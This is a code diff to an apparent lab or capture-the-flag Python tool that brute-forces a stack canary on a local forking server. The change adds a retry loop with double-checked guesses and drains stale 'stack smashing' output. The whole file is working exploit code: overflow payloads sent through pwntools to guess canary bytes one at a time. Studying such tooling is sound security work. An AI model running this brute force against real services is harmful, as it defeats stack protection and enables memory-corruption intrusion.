@@ -10,6 +10,7 @@ _CANARY_SIZE = 8
 _ATTEMPT_RECV_TIMEOUT = 0.15
 _SMASH_MARKER = b"stack smashing"
 _DEFAULT_SEARCH_MAX = 512
+_MAX_POSITION_ATTEMPTS = 3
 
 
 class CanaryNotFoundError(Exception):
@@ -48,19 +49,32 @@ def crack_canary(server: ForkingServer, search_max: int = _DEFAULT_SEARCH_MAX) -
     offset = _find_canary_offset(server, search_max)
     canary = bytearray()
     for position in range(_CANARY_SIZE):
-        found = None
+        canary.append(_find_byte_at_position(server, offset, canary, position))
+    return CanaryResult(offset=offset, canary=bytes(canary))
+
+
+def _find_byte_at_position(server: ForkingServer, offset: int, canary: bytearray, position: int) -> int:
+    # A "no smash" reading for a *wrong* guess (a false negative — the
+    # smash message genuinely didn't arrive within _ATTEMPT_RECV_TIMEOUT,
+    # e.g. under real scheduling jitter on shared CI hardware) must not be
+    # accepted on a single reading: confirmed for real that a first
+    # version of this retry (looping the whole sweep again on total
+    # failure) just changed the failure mode from a loud
+    # CanaryNotFoundError to a *silently wrong* accepted byte, since nothing
+    # re-checked whichever guess happened to read as "not smashing" before
+    # trusting it. Requiring two independent "not smashing" readings for
+    # the *same* guess before accepting it squares the odds of a false
+    # accept — a real wrong guess would need to read as "no smash" twice
+    # in a row, not just once.
+    for _ in range(_MAX_POSITION_ATTEMPTS):
         for guess in range(256):
             payload = b"A" * offset + bytes(canary) + bytes([guess])
-            if not _smashes(server, payload):
-                found = guess
-                break
-        if found is None:
-            raise CanaryNotFoundError(
-                f"no working byte found at canary position {position} "
-                f"(cracked so far: {bytes(canary).hex()})"
-            )
-        canary.append(found)
-    return CanaryResult(offset=offset, canary=bytes(canary))
+            if not _smashes(server, payload) and not _smashes(server, payload):
+                return guess
+    raise CanaryNotFoundError(
+        f"no working byte found at canary position {position} "
+        f"(cracked so far: {bytes(canary).hex()}) after {_MAX_POSITION_ATTEMPTS} attempts"
+    )
 
 
 def _find_canary_offset(server: ForkingServer, search_max: int) -> int:
@@ -84,6 +98,16 @@ def _find_canary_offset(server: ForkingServer, search_max: int) -> int:
 
 
 def _smashes(server: ForkingServer, payload: bytes) -> bool:
+    # A slow-to-arrive "stack smashing" message from the *previous* guess
+    # can otherwise still be sitting in server.io's buffer when this
+    # guess's own recv() below runs, misattributing a stale crash to the
+    # current (possibly correct) byte — a race unlikely to matter under
+    # this project's slower QEMU devcontainer, but real on fast native
+    # hardware firing ~2000 guesses in quick succession. Draining
+    # non-blockingly right before sending narrows that window to (at
+    # worst) the gap between this line and the send below, rather than a
+    # full previous attempt's cycle time.
+    server.io.recv(timeout=0)
     io = remote("127.0.0.1", server.port)
     io.send(payload)
     data = server.io.recv(timeout=_ATTEMPT_RECV_TIMEOUT)
